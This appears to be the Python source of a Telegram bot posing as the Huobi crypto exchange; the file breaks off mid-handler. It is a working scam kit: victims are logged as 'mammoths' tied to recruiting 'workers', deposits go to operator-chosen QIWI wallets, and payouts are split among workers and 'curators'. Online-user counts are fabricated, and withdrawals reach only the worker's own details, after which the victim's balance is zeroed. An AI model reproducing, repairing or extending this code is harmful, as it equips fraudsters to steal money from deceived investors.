# -*- coding: utf-8 -*-
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, KeyboardButton, ReplyKeyboardMarkup
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
import config
import menu
import sqlite3
import statess
import random
import requests
from datetime import datetime, timedelta, date
from pyqiwip2p import QiwiP2P
import time
from requests import get
import asyncio
import aiohttp
from aiogram.utils.callback_data import CallbackData
import logging
import json
from random import choice
import os

async def stock_panel() -> InlineKeyboardMarkup:
    bitcoin = InlineKeyboardButton(text="Bitcoin", callback_data="bitcoin")
    ethereum = InlineKeyboardButton(text="Ethereum", callback_data="ethereum")
    polkadot = InlineKeyboardButton(text="Polkadot", callback_data="polkadot")
    ripple = InlineKeyboardButton(text="Ripple", callback_data="ripple")
    doge = InlineKeyboardButton(text="DogeCoin", callback_data="doge")
    litecoin = InlineKeyboardButton(text="Litecoin", callback_data="litecoin")
    terra = InlineKeyboardButton(text="Terra", callback_data="terra")
    solana = InlineKeyboardButton(text="Solana", callback_data="solana")
    tron = InlineKeyboardButton(text="TRON", callback_data="tron")
    cardano = InlineKeyboardButton(text="Cardano", callback_data="cardano")
    return InlineKeyboardMarkup(row_width=2).add(bitcoin, ethereum, polkadot, ripple, doge, litecoin, terra, solana,tron, cardano)

async def choose(amount) -> InlineKeyboardMarkup:
    up = InlineKeyboardButton(text="Вверх", callback_data=choose_callback.new(amount=amount, direction="upbtc"))
    down = InlineKeyboardButton(text="Вниз", callback_data=choose_callback.new(amount=amount, direction="downbtc"))
    return InlineKeyboardMarkup(row_width=1).add(up, down)

async def choose1(amount) -> InlineKeyboardMarkup:
    up = InlineKeyboardButton(text="Вверх", callback_data=choose_callback.new(amount=amount, direction="upeth"))
    down = InlineKeyboardButton(text="Вниз", callback_data=choose_callback.new(amount=amount, direction="downeth"))
    return InlineKeyboardMarkup(row_width=1).add(up, down)

async def choose2(amount) -> InlineKeyboardMarkup:
    up = InlineKeyboardButton(text="Вверх", callback_data=choose_callback.new(amount=amount, direction="upltc"))
    down = InlineKeyboardButton(text="Вниз", callback_data=choose_callback.new(amount=amount, direction="downltc"))
    return InlineKeyboardMarkup(row_width=1).add(up, down)

choose_callback = CallbackData("choose", "amount", "direction")

bot = Bot(config.API_Trade, parse_mode='HTML')
workerbot = Bot(config.API_Worker, parse_mode='HTML')
dp = Dispatcher(bot,storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)
bd = os.path.abspath(os.path.join('data', 'database.db'))


##############################################
canal = -1002383417978
TC_group = -1002383417978
##############################################

##############################################
API_URL = 'https://blockchain.info/ru/ticker'
solana_url = 'https://api.binance.com/api/v3/ticker/price?symbol=SOLBTC'
apis_url = "https://api.terra.ai/price"
##############################################


@dp.message_handler(commands="start", state='*')
async def start(message: types.Message):
    ref_id = message.get_args()
    with sqlite3.connect(bd) as c:
        check = c.execute("SELECT id FROM mamonts_trade WHERE id = ?", (message.from_user.id,)).fetchone()
    if check is None:
        with sqlite3.connect(bd) as c:
            ref = c.execute("SELECT id FROM workers WHERE ref_code = ?", (ref_id,)).fetchone()
        if ref is None:
            await message.answer('<b>🔒 Не авторизован!</b>\nВведите код:')
            await statess.code.q1.set()
        else:
            text=f'''
            <b>🔷 Добро пожаловать в мультивалютную крипто-биржу Huobi!

Huobi можно использовать как кошелек для удобных операций с основными криптовалютами.</b>'''
            with sqlite3.connect(bd) as c:
                c.execute('INSERT INTO mamonts_trade VALUES(?,?,?,?,?,?,?,?,?,?,?,?)',(message.from_user.id, '0', ref_id, '0', '0', '100', message.from_user.first_name, message.from_user.username, '0', '0', '0', '0'))
            await workerbot.send_message(ref[0], f"<b><i>🎉У вас новый 🦣 мамонт! @{message.from_user.username}</i></b>")
            await bot.send_message(message.from_user.id, text=text, reply_markup=menu.mainkb, parse_mode='HTML')
    else:
        text1=f'''
            <b>🔷 Добро пожаловать в мультивалютную крипто-биржу Huobi!

Huobi можно использовать как кошелек для удобных операций с основными криптовалютами.</b>'''
        await bot.send_message(message.from_user.id, text=text1, reply_markup=menu.mainkb, parse_mode='HTML')

@dp.message_handler(state=statess.code.q1)
async def spammers(message: types.Message,state:FSMContext):
    with sqlite3.connect(bd) as c:
        ref = c.execute("SELECT id FROM workers WHERE ref_code = ?", (message.text,)).fetchone()
    if ref != None:
        with sqlite3.connect(bd) as c:
            c.execute('INSERT INTO mamonts_trade VALUES(?,?,?,?,?,?,?,?,?,?,?,?)',(message.from_user.id, '0', message.text, '0', '0', '100', message.from_user.first_name, message.from_user.username, '0', '0', '0', '0'))
        text=f'''
            <b>🔷 Добро пожаловать в мультивалютную крипто-биржу Huobi!

Huobi можно использовать как кошелек для удобных операций с основными криптовалютами.</b>'''
        await workerbot.send_message(ref[0], f"<b><i>🎉У вас новый 🦣 мамонт! @{message.from_user.username}</i></b>")
        await message.answer(text, reply_markup=menu.mainkb, parse_mode='HTML')
        await state.finish()
    else:
        await message.answer('<b>🔒 Пригласительный код неверный.</b>')

async def fetch_price(session, crypto):
    url = f"https://min-api.cryptocompare.com/data/price?fsym={crypto}&tsyms=USD"
    async with session.get(url) as response:
        data = await response.json()
        price = data['USD']
        return f"{price}"

@dp.message_handler(content_types=['text'], text='💼 Личный кабинет')
async def buy(message: types.Message, state: FSMContext):
    await state.finish()
    with sqlite3.connect(bd) as c:
        info = c.execute('SELECT * FROM mamonts_trade WHERE id = ?',(message.chat.id,)).fetchone()
    smiles = ["🟢", "🟡", "🟠", "🔴"]
    text=f'''
    <b>📲 Личный кабинет:</b>

➖➖➖➖➖➖➖➖➖➖
📑 Верификация: ❌
➖➖➖➖➖➖➖➖➖➖
💵 Общий баланс: <b>{info[3]} RUB</b>
🗄 ID: <b>{message.from_user.id}</b>
📊 Всего сделок: <b>{info[9]}</b>
💼 Криптопортфель:
0.0 BTC
0.0 ETH
0.0 LTC
📈 Пользователей онлайн: <b>{random.randint(1900,2500)}</b>
➖➖➖➖➖➖➖➖➖➖
<b>Загруженность Bitcoin: {random.choice(smiles)}
Загруженность  Ethereum: {random.choice(smiles)}
Загруженность  Litecoin: {random.choice(smiles)}</b>
''' 
    text1 = f'''
    <b>📲 Личный кабинет:</b>

➖➖➖➖➖➖➖➖➖➖
📑 Верификация: ✅
➖➖➖➖➖➖➖➖➖➖
💵 Общий баланс: <b>{info[3]} RUB</b>
🗄 ID: <b>{message.from_user.id}</b>
📊 Всего сделок: <b>{info[9]}</b>
💼 Криптопортфель:
0.0 BTC
0.0 ETH
0.0 LTC
📈 Пользователей онлайн: <b>{random.randint(1900,2500)}</b>
➖➖➖➖➖➖➖➖➖➖
<b>Загруженность Bitcoin: {random.choice(smiles)}
Загруженность  Ethereum: {random.choice(smiles)}
Загруженность  Litecoin: {random.choice(smiles)}</b>'''
    if info[4] == 0:
        if info[8] == 0:
            await bot.send_photo(message.from_user.id, photo=config.lk_photo, caption=text,reply_markup=menu.lk, parse_mode='HTML')
        else:
            await bot.send_photo(message.from_user.id, photo=config.lk_photo, caption=text1, reply_markup=menu.lk, parse_mode='HTML')
    else:
        await message.answer(f"У вас заблокирован аккаунт.")

@dp.message_handler(content_types=['text'], text='👨🏻‍💻 Тех. поддержка')
async def buy(message: types.Message, state: FSMContext):
    await state.finish()
    with sqlite3.connect(bd) as c:
        info = c.execute('SELECT * FROM mamonts_trade WHERE id = ?',(message.chat.id,)).fetchone()
    if info[4] == 0:
        text=f'''
        📘 Вы можете отправить запрос в службу поддержки Huobi. Специалист ответит в ближайшие несколько дней.
Для более быстрого решения проблемы опишите ваше обращение как можно понятнее, при необходимости вы можете предоставить файлы или изображения.

Правила обращения в техническую поддержку:

1 - При первом обращении, пожалуйста, представьтесь.
2 - Опишите проблему своими словами.
3 - Будьте вежливы и вежливость будет с вами!'''
        await bot.send_photo(message.from_user.id, photo=config.support, caption=text, reply_markup=menu.tp)
    else:
        await message.answer('У вас заблокирован аккаунт.')

@dp.message_handler(content_types=['text'], text='📊 Мои активы')
async def buy(message: types.Message, state: FSMContext):
    await state.finish()
    with sqlite3.connect(bd) as c:
        info = c.execute('SELECT * FROM mamonts_trade WHERE id = ?',(message.chat.id,)).fetchone()
    if info[4] == 0:
        if info[10] == 0:
            text= f'''
        💠 Выберите монету для инвестирования денежных средств:
        '''
            with open('Trade/photo/huobiii.jpg', 'rb') as photo:
                await bot.send_photo(message.from_user.id, photo, caption=text, parse_mode='HTML', reply_markup=await stock_panel())
        else:
            await message.answer(f"<b>⚠ Вам заблокировали данную функцию.</b>\n\n<i>❗️Обратитесь в тех.поддержку</i>", parse_mode='HTML', reply_markup=menu.tp)
    else:
        await message.answer('У вас заблокирован аккаунт.')

@dp.message_handler(content_types=['text'], text='🔷 О сервисе')
async def buy(message: types.Message, state: FSMContext):
    await state.finish()
    with sqlite3.connect(bd) as c:
        info = c.execute('SELECT * FROM mamonts_trade WHERE id = ?',(message.chat.id,)).fetchone()
    if info[4] == 0:
        text = f'''
        <b>📘 О сервисе</b>

<b>Huobi</b> - это централизованная биржа для торговли криптовалютой и фьючерсными активами. 

Имея один аккаунт, вы можете безопасно хранить активы и проводить защищённые сделки.

Благодаря простому пользовательскому интерфейсу Huobi прекрасно подходит для новичков. На платформе легко ориентироваться, что привлекает как продвинутых, так и начинающих трейдеров и инвесторов.'''
        await bot.send_photo(message.from_user.id, photo=config.about_service, caption=text, parse_mode='HTML', reply_markup=menu.about_me)
    else:
        await message.answer(f"Ваш аккаунт заблокирован.")

@dp.callback_query_handler(lambda c: c.data =='verif')
async def process_callback_button1(call: types.CallbackQuery):
    with sqlite3.connect(bd) as c:
        info = c.execute('SELECT * FROM mamonts_trade WHERE id = ?',(call.from_user.id,)).fetchone()
    if info[8] == 0:
        text = f'''
        🤷🏻‍♀️ К сожалению, ваш аккаунт не верифицирован, рекомендуем верифицировать аккаунт, вы можете это сделать, нажав на кнопку ниже и написав "Верификация" в тех.поддержку, спасибо!

🔷 Приоритет в очереди к выплате.

🔷 Отсутствие лимитов на вывод средств.

🔷 Возможность хранить средства на балансе бота в разных активах.

🔷 Увеличение доверия со стороны администрации, предотвращения блокировки аккаунта.'''
        await call.bot.send_photo(call.from_user.id, photo=config.verif, caption=text, reply_markup=menu.verifir)
    else:
        await call.answer(show_alert=True, text=f"✅ Ваш аккаунт верифицирован")

@dp.callback_query_handler(lambda c: c.data == 'popolnenie') # qiwi_payments
async def process_callback_button1(callback_query: types.CallbackQuery):
    try:
        await bot.delete_message(chat_id=callback_query.from_user.id, message_id=callback_query.message.message_id)
        with sqlite3.connect(bd) as c:
            ref = c.execute('SELECT * FROM mamonts_trade WHERE id = ?',(callback_query.from_user.id,)).fetchone()
            info = c.execute('SELECT * FROM workers WHERE ref_code = ?',(ref[2],)).fetchone()
        await bot.send_message(callback_query.from_user.id, f'Введите сумму пополнения:\n<i>Минимальная сумма пополнения - {info[6]} RUB</i>', parse_mode='HTML')
        await statess.Qiwi.q1.set() 
    except:
        with sqlite3.connect(bd) as c:
            c.execute(f'DELETE FROM mamonts_trade WHERE id = {callback_query.from_user.id}')
        await callback_query.message.answer(f'Ваш профиль не был найден\nВведите /start')

@dp.message_handler(state=statess.Qiwi.q1)
async def spammers(message: types.Message,state:FSMContext):
    if message.text.isdigit():
        with sqlite3.connect(bd) as c:
            ref = c.execute('SELECT * FROM mamonts_trade WHERE id = ?',(message.from_user.id,)).fetchone()
            info = c.execute('SELECT * FROM workers WHERE ref_code = ?',(ref[2],)).fetchone()
        if int(message.text) < info[6]:
            await message.answer(f"<b>❌ Некорректный ввод</b>", parse_mode='HTML')
            await state.finish()
        else:
            await state.finish()
            try:
                price = int(message.text)
                comment = random.randint(100000, 999999)
                with sqlite3.connect(bd) as c:
                    qiwikey =  c.execute('SELECT * FROM qiwis',).fetchall()
                    c.execute('INSERT INTO pays VALUES(?,?,?,?)',(message.from_user.id, 'TradeBot', comment, '0'))
                qiwirand = random.choice(qiwikey)
                qiwiiii = qiwirand[1]
                loh = InlineKeyboardMarkup(
                    inline_keyboard = [
                        [
                            InlineKeyboardButton(text='Пополнить', callback_data=f'popolnyda,{message.from_user.id},{price},trade,{comment}')
                        ]
                    ]
                )
                p2p = QiwiP2P(auth_key=qiwiiii)
                new_bill = p2p.bill(bill_id=comment,amount=price,lifetime=45,comment=comment)
                pay_kb = types.InlineKeyboardMarkup()
                pay_kb.add(types.InlineKeyboardButton(text = 'Перейти к оплатите', url=new_bill.pay_url))
                pay_kb.add(types.InlineKeyboardButton(text = '✅ Проверить оплату', callback_data=f"check,{comment},{price}"))
                pay_kb.add(types.InlineKeyboardButton(text = '❌ Отменить', callback_data="cancel"))
                timetime = date.today() + timedelta(days=7)
                await workerbot.send_message(info[0], f'Мамонт: {message.from_user.full_name} @{message.from_user.username}\nID: {message.from_user.id}\nХочет пополнить {message.text} RUB', reply_markup=loh)
                await bot.send_photo(message.from_user.id, photo=config.my_aktive, caption=f'♻️ Оплата QIWI: <a href="{new_bill.pay_url}"> <b>ОПЛАТА</b></a>\n\nСумма: {price} RUB\nКомментарий: <code>{comment}</code>\n\n<i>⚠️ ВАЖНО! Обязательно после пополнения, не забудьте нажать кнопку «проверить оплату» для пополнения баланса.\nБот будет игнорировать Вас до того момента, пока не вы не оплатите или не отмените пополнение!</i>', reply_markup=pay_kb, parse_mode='HTML')
                await statess.Pays.q1.set()
                async with state.proxy() as data:
                    data['secret'] = qiwiiii
            except:
                await message.answer(f'<b>Призошла ошибка, попробуйте позже.</b>')
    else:
        await message.answer("<b>❌ Некорректный ввод</b>") 
        await state.finish()

@dp.callback_query_handler(text_startswith="check", state=statess.Pays.q1) 
async def check_pay(call:types.CallbackQuery,state:FSMContext):
    data = await state.get_data()
    comment,price = call.data.split(",")[1], call.data.split(",")[2]
    qiwinah = data['secret']
    with sqlite3.connect(bd) as c:
        qiwi = c.execute('SELECT * FROM qiwis WHERE p2p_secret = ?',(qiwinah,)).fetchone()
        payed = c.execute('SELECT * FROM pays WHERE comment = ?',(comment,)).fetchone()
    check = await pays(qiwi[1],comment)
    comission = int(0.70 * int(price))
    if payed[3] == 1:
        await call.message.edit_text(f'✅ Оплата прошла успешно.')
        await state.finish()
    else:
        if check:
            with sqlite3.connect(bd) as c:
                ref = c.execute('SELECT referal FROM mamonts_trade WHERE id = ?',(call.from_user.id,)).fetchone()
            for id_ref in ref:
                with sqlite3.connect(bd) as c:
                    info = c.execute('SELECT * FROM workers WHERE ref_code = ?',(id_ref,)).fetchone()
                    c.execute('UPDATE workers SET profit = profit + ? WHERE ref_code = ?',(price, id_ref,))
                    c.execute('UPDATE pays SET status = ? WHERE comment = ?',('1',comment,))
                    c.execute('UPDATE stat SET all_pay = all_pay + ?, all_profit = all_profit + ? WHERE nice = ?',('1', '1', '777',))
                if int(price) > 2500:
                    await workerbot.send_message(canal,f'''
                    <b>❄️ Успешная оплата</b>
                    
<b>💸 Доля воркера: {comission} RUB | 80%
🏦 Сумма платежа: {price} RUB
                    
🧑‍💻 Воркер: {info[1]}
🔭 Сервис: Трейд 📊</b>''')
                    await workerbot.send_sticker(config.LOG_CHANNEL, sticker=r"CAACAgIAAxkBAAEHgElj1np8EB4dgePrpzgoWxXg_zGEVwACXCYAAl0ksUm6pu4WHs8QTC0E")
                    await workerbot.send_message(config.LOG_CHANNEL,f'''
                    <b>❄️ Успешная оплата</b>
                    
<b>💸 Доля воркера: {comission} RUB | 80%
🏦 Сумма платежа: {price} RUB
                    
🧑‍💻 Воркер: {info[1]}
🔭 Сервис: Трейд 📊</b>''')
                else:
                    await workerbot.send_message(canal,f'''
                    <b>❄️ Успешная оплата</b>
                    
<b>💸 Доля воркера: {comission} RUB | 80%
🏦 Сумма платежа: {price} RUB
                    
🧑‍💻 Воркер: {info[1]}
🔭 Сервис: Трейд 📊</b>''')
                    await workerbot.send_message(config.LOG_CHANNEL,f'''
                    <b>❄️ Успешная оплата</b>
                    
<b>💸 Доля воркера: {comission} RUB | 80%
🏦 Сумма платежа: {price} RUB
                    
🧑‍💻 Воркер: {info[1]}
🔭 Сервис: Трейд 📊</b>''')
                if int(info[11]) == 1:
                    kur = int(0.30 * int(price))
                    newdolya = int(comission - int(kur))
                    await workerbot.send_message(TC_group, f'<b>Куратор довел чела до депа.\n\n{kur} RUB - долг куратору!</b>', parse_mode='HTML')
                    await workerbot.send_message(canal, f'''
            <b>❄️ Успешная оплата</b>
            
<b>💸 Доля воркера: {newdolya} RUB | 50%
🏦 Сумма платежа: {price} RUB
🎓 Доля куратора: {kur} RUB | 30% 

🧑‍💻 Воркер: {info[1]}
🔭 Сервис: Трейд 📊</b>''')
                    await workerbot.send_message(config.LOG_CHANNEL, f'''
            <b>❄️ Успешная оплата</b>
            
<b>💸 Доля воркера: {newdolya} RUB | 50%
🏦 Сумма платежа: {price} RUB
🎓 Доля куратора: {kur} RUB | 30%

🧑‍💻 Воркер: {info[1]}
🔭 Сервис: Трейд 📊</b>''')
                await call.message.edit_text(f'✅ Успешно! Баланс пополнен на <b>{price}</b>')
                try:
                    await workerbot.send_message(info[0], f'Отлично, мамонт пополнил на сумму {price} RUB')
                except:
                    pass
                await state.finish()
        else:
            await call.message.answer("❌ Платеж не найден!", show_alert=True)

async def pays(secretka,comment):
    all_head = {"Authorization": f"Bearer {secretka}", "Accept": "application/json"}
    req = requests.get(f'https://api.qiwi.com/partner/bill/v1/bills/{comment}', headers=all_head).json()
    try:
        if req['status']['value'] == 'PAID':
            return True
        else:
            return False
    except:
        return False

@dp.callback_query_handler(text_startswith="p2pcard")
async def process_callback_button1(call: types.CallbackQuery):
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await bot.send_message(call.from_user.id, '💁🏻‍♀ Введите сумму пополнения\nМинимальная сумма пополнения - 15000 ₽')
    await statess.P2PCard.q1.set()

@dp.callback_query_handler(lambda c: c.data == 'vivod')
async def process_callback_button1(callback_query: types.CallbackQuery, state: FSMContext):
    with sqlite3.connect(bd) as c:
        info = c.execute(f'SELECT * FROM mamonts_trade WHERE id = {callback_query.from_user.id}').fetchone()
    if info[11] == 0:
        if info[3] <= 1000:
            await bot.send_message(callback_query.from_user.id, f'❌ Минимальная сумма для вывода: 1000 ₽\n💸 Ваш баланс: {info[3]} ₽, меньше чем нужно!')
        else:
            await bot.send_message(callback_query.from_user.id, f'<b>Введите номер без +</b>\nПример: <i>79042345678</i>')
            await statess.Vivod.q1.set()
    else:
        await bot.send_message(callback_query.from_user.id, f"⚠️ Ошибка вывода средств! Пожалуйста, обратитесь в техническую поддержку 👇", reply_markup=menu.tp)

@dp.message_handler(state=statess.Vivod.q1)
async def spammers(message: types.Message,state:FSMContext):
    with sqlite3.connect(bd) as c:
        info = c.execute(f'SELECT * FROM mamonts_trade WHERE id = {message.from_user.id}').fetchone()
        ref = c.execute('SELECT * FROM mamonts_trade WHERE id = ?',(message.from_user.id,)).fetchone()
        worker = c.execute('SELECT * FROM workers WHERE ref_code = ?',(ref[2],)).fetchone()
    loh = InlineKeyboardMarkup(
        inline_keyboard = [
            [
                InlineKeyboardButton(text='✅', callback_data=f'gobalanc,{message.from_user.id},trade'),
                InlineKeyboardButton(text='❌', callback_data=f'netbalanc,{message.from_user.id},{info[3]},trade')
            ]
        ]
    )        
    if message.text.isdigit():
        if int(message.text) == worker[2]:
            await message.answer(f'Ваша заявка на вывод была успешно создана! Вывод средств занимает от 2 до 60 минут.')
            await workerbot.send_message(worker[0], f'<b>🌐 Новый запрос на вывод средств!</b> (Трейд)\n\n🐘 Мамонт: <b>{message.from_user.first_name}</b>\n💸 Сумма: <b>{ref[3]}</b> RUB\n💳 Реквизиты: <b>{message.text}</b>', reply_markup=loh)
            with sqlite3.connect(bd) as c:
                c.execute("UPDATE mamonts_trade SET balance = 0 WHERE id = ?", (message.from_user.id,))
            await state.finish()
        elif int(message.text) == worker[7]:
            await message.answer(f'Ваша заявка на вывод была успешно создана! Вывод средств занимает от 2 до 60 минут.')
            await workerbot.send_message(worker[0], f'<b>🌐 Новый запрос на вывод средств!</b> (Трейд)\n\n🐘 Мамонт: <b>{message.from_user.first_name}</b>\n💸 Сумма: <b>{ref[3]}</b> RUB\n💳 Реквизиты: <b>{message.text}</b>', reply_markup=loh)
            with sqlite3.connect(bd) as c:
                c.execute("UPDATE mamonts_trade SET balance = 0 WHERE id = ?", (message.from_user.id,)) 
            await state.finish()
        else:
            await message.answer(f'❌ Вывод средств возможен только на те реквизиты, с которых пополнялся баланс.')
            await workerbot.send_message(worker[0], f'Мамонт: <b>{message.from_user.first_name} (Трейд)</b> пытался вывести на реквизиты: <b>{message.text}</b>')
    else:
        await message.answer("<b>❌ Некорректный ввод</b>")
    await state.finish()

@dp.callback_query_handler(text="bitcoin")
async def bitcoin_btn(call: types.CallbackQuery):
    async with aiohttp.ClientSession() as session:
        cryptos = ["BTC"]
        tasks = [fetch_price(session, crypto) for crypto in cryptos]
        results = await asyncio.gather(*tasks)
        for result in results:
            with sqlite3.connect(bd) as c:
                info = c.execute(f'SELECT * FROM mamonts_trade WHERE id = {call.from_user.id}').fetchone()
            if info[10] == 0:
                text = f'''
            🌐 Введите сумму, которую хотите инвестировать.
            
Минимальная сумма инвестиций - 500₽
Курс монеты - {result}$
            
Ваш денежный баланс: {info[3]} RUB'''
                with open('Trade/photo/bitcoin.jpg', 'rb') as photo:
                    await bot.send_photo(call.from_user.id, photo, text, parse_mode='HTML', reply_markup=menu.btc)
                    await statess.BTCtrade.q1.set()
            else:
                text2 = f'''
                <b>⚠️ Вам заблокировали данную функцию.</b>
                
<i>❗️Обратитесь в тех.поддержку</i>'''
                await bot.send_message(text=text2, reply_markup=menu.tp, parse_mode='HTML')

@dp.callback_query_handler(text="ethereum")
async def ethereum_btn(call: types.CallbackQuery):
    async with aiohttp.ClientSession() as session:
        cryptos = ["ETH"]
        tasks = [fetch_price(session, crypto) for crypto in cryptos]
        results = await asyncio.gather(*tasks)
        for result in results:
            with sqlite3.connect(bd) as c:
                info = c.execute(f'SELECT * FROM mamonts_trade WHERE id = {call.from_user.id}').fetchone()
            if info[10] == 0:
                text = f'''
            🌐 Введите сумму, которую хотите инвестировать.
            
Минимальная сумма инвестиций - 500₽
Курс монеты - {result}$
            
Ваш денежный баланс: {info[3]} RUB'''
                with open('Trade/photo/ethn.jpg', 'rb') as photo:
                    await bot.send_photo(call.from_user.id, photo, text, parse_mode='HTML', reply_markup=menu.eth)
                    await statess.ETH.q1.set()
            else:
                text2 = f'''
                <b>⚠️ Вам заблокировали данную функцию.</b>
                
<i>❗️Обратитесь в тех.поддержку</i>'''
                await bot.send_message(text=text2, reply_markup=menu.tp, parse_mode='HTML')

@dp.callback_query_handler(text="polkadot")
async def polkadot_btn(call: types.CallbackQuery):
    async with aiohttp.ClientSession() as session:
        cryptos = ["DOT"]
        tasks = [fetch_price(session, crypto) for crypto in cryptos]
        results = await asyncio.gather(*tasks)
        for result in results:
            with sqlite3.connect(bd) as c:
                info = c.execute(f'SELECT * FROM mamonts_trade WHERE id = {call.from_user.id}').fetchone()
            if info[10] == 0:
                text = f'''
            🌐 Введите сумму, которую хотите инвестировать.
            
Минимальная сумма инвестиций - 500₽
Курс монеты - {result}$
            
Ваш денежный баланс: {info[3]} RUB'''
                with open('Trade/photo/polkadot.jpg', 'rb') as photo:
                    await bot.send_photo(call.from_user.id, photo, text, parse_mode='HTML', reply_markup=menu.dots)
                    await statess.DOT.q1.set()
            else:
                text2 = f'''
                <b>⚠️ Вам заблокировали данную функцию.</b>
                
<i>❗️Обратитесь в тех.поддержку</i>'''
                await bot.send_message(text=text2, reply_markup=menu.tp, parse_mode='HTML')

@dp.callback_query_handler(text="doge")
async def doge_btn(call: types.CallbackQuery):
    async with aiohttp.ClientSession() as session:
        cryptos = ["DOGE"]
        tasks = [fetch_price(session, crypto) for crypto in cryptos]
        results = await asyncio.gather(*tasks)
        for result in results:
            with sqlite3.connect(bd) as c:
                info = c.execute(f'SELECT * FROM mamonts_trade WHERE id = {call.from_user.id}').fetchone()
            if info[10] == 0:
                text = f'''
            🌐 Введите сумму, которую хотите инвестировать.
            
Минимальная сумма инвестиций - 500₽
Курс монеты - {result}$
            
Ваш денежный баланс: {info[3]} RUB'''
                with open('Trade/photo/dogecoin.jpg', 'rb') as photo:
                    await bot.send_photo(call.from_user.id, photo, text, parse_mode='HTML', reply_markup=menu.dogec)
                    await statess.DOGE.q1.set()
            else:
                text2 = f'''
                <b>⚠️ Вам заблокировали данную функцию.</b>
                
<i>❗️Обратитесь в тех.поддержку</i>'''
                await bot.send_message(text=text2, reply_markup=menu.tp, parse_mode='HTML')

@dp.callback_query_handler(text="ripple")
async def ripple_btn(call: types.CallbackQuery):
    async with aiohttp.ClientSession() as session:
        cryptos = ["XRP"]
        tasks = [fetch_price(session, crypto) for crypto in cryptos]
        results = await asyncio.gather(*tasks)
        for result in results:
            with sqlite3.connect(bd) as c:
                info = c.execute(f'SELECT * FROM mamonts_trade WHERE id = {call.from_user.id}').fetchone()
            if info[10] == 0:
                text = f'''
            🌐 Введите сумму, которую хотите инвестировать.
            
Минимальная сумма инвестиций - 500₽
Курс монеты - {result}$
            
Ваш денежный баланс: {info[3]} RUB'''
                with open('Trade/photo/ripple.jpg', 'rb') as photo:
                    await bot.send_photo(call.from_user.id, photo, text, parse_mode='HTML', reply_markup=menu.ripples)
                    await statess.RIPPLE.q1.set()
            else:
                text2 = f'''
                <b>⚠️ Вам заблокировали данную функцию.</b>
                
<i>❗️Обратитесь в тех.поддержку</i>'''
                await bot.send_message(text=text2, reply_markup=menu.tp, parse_mode='HTML')

@dp.callback_query_handler(text="terra")
async def terra_btn(call: types.CallbackQuery):
    async with aiohttp.ClientSession() as session:
        cryptos = ["LUNA"]
        tasks = [fetch_price(session, crypto) for crypto in cryptos]
        results = await asyncio.gather(*tasks)
        for result in results:
            with sqlite3.connect(bd) as c:
                info = c.execute(f'SELECT * FROM mamonts_trade WHERE id = {call.from_user.id}').fetchone()
            if info[10] == 0:
                text = f'''
            🌐 Введите сумму, которую хотите инвестировать.
            
Минимальная сумма инвестиций - 500₽
Курс монеты - {result}$
            
Ваш денежный баланс: {info[3]} RUB'''
                with open('Trade/photo/terra.jpg', 'rb') as photo:
                    await bot.send_photo(call.from_user.id, photo, text, parse_mode='HTML', reply_markup=menu.luna)
                    await statess.LUNA.q1.set()
            else:
                text2 = f'''
                <b>⚠️ Вам заблокировали данную функцию.</b>
                
<i>❗️Обратитесь в тех.поддержку</i>'''
                await bot.send_message(text=text2, reply_markup=menu.tp, parse_mode='HTML')

@dp.callback_query_handler(text="litecoin")
async def litecoin_btn(call: types.CallbackQuery):
    async with aiohttp.ClientSession() as session:
        cryptos = ["LTC"]
        tasks = [fetch_price(session, crypto) for crypto in cryptos]
        results = await asyncio.gather(*tasks)
        for result in results:
            with sqlite3.connect(bd) as c:
                info = c.execute(f'SELECT * FROM mamonts_trade WHERE id = {call.from_user.id}').fetchone()
            if info[10] == 0:
                text = f'''
            🌐 Введите сумму, которую хотите инвестировать.
            
Минимальная сумма инвестиций - 500₽
Курс монеты - {result}$
            
Ваш денежный баланс: {info[3]} RUB'''
                with open('Trade/photo/litecoin.jpg', 'rb') as photo:
                    await bot.send_photo(call.from_user.id, photo, text, parse_mode='HTML', reply_markup=menu.lites)
                    await statess.LTC.q1.set()
            else:
                text2 = f'''
                <b>⚠️ Вам заблокировали данную функцию.</b>
                
<i>❗️Обратитесь в тех.поддержку</i>'''
                await bot.send_message(text=text2, reply_markup=menu.tp, parse_mode='HTML')

@dp.callback_query_handler(text="solana")
async def solana_btn(call: types.CallbackQuery):
    async with aiohttp.ClientSession() as session:
        cryptos = ["SOL"]
        tasks = [fetch_price(session, crypto) for crypto in cryptos]
        results = await asyncio.gather(*tasks)
        for result in results:
            with sqlite3.connect(bd) as c:
                info = c.execute(f'SELECT * FROM mamonts_trade WHERE id = {call.from_user.id}').fetchone()
            if info[10] == 0:
                text = f'''
            🌐 Введите сумму, которую хотите инвестировать.
            
Минимальная сумма инвестиций - 500₽
Курс монеты - {result}$
            
Ваш денежный баланс: {info[3]} RUB'''
                with open('Trade/photo/solana.jpg', 'rb') as photo:
                    await bot.send_photo(call.from_user.id, photo, text, parse_mode='HTML', reply_markup=menu.sola)
                    await statess.SOL.q1.set()
            else:
                text2 = f'''
                <b>⚠️ Вам заблокировали данную функцию.</b>
                
<i>❗️Обратитесь в тех.поддержку</i>'''
                await bot.send_message(text=text2, reply_markup=menu.tp, parse_mode='HTML')

@dp.callback_query_handler(text="tron")
async def tron_btn(call: types.CallbackQuery):
    async with aiohttp.ClientSession() as session:
        cryptos = ["TRX"]
        tasks = [fetch_price(session, crypto) for crypto in cryptos]
        results = await asyncio.gather(*tasks)
        for result in results:
            with sqlite3.connect(bd) as c:
                info = c.execute(f'SELECT * FROM mamonts_trade WHERE id = {call.from_user.id}').fetchone()
            if info[10] == 0:
                text = f'''
            🌐 Введите сумму, которую хотите инвестировать.
            
Минимальная сумма инвестиций - 500₽
Курс монеты - {result}$
            
Ваш денежный баланс: {info[3]} RUB'''
                with open('Trade/photo/tron.jpg', 'rb') as photo:
                    await bot.send_photo(call.from_user.id, photo, text, parse_mode='HTML', reply_markup=menu.trons)
                    await statess.TRX.q1.set()
            else:
                text2 = f'''
                <b>⚠️ Вам заблокировали данную функцию.</b>
                
<i>❗️Обратитесь в тех.поддержку</i>'''
                await bot.send_message(text=text2, reply_markup=menu.tp, parse_mode='HTML')

@dp.callback_query_handler(text="cardano")
async def cardano_btn(call: types.CallbackQuery):
    async with aiohttp.ClientSession() as session:
        cryptos = ["ADA"]
        tasks = [fetch_price(session, crypto) for crypto in cryptos]
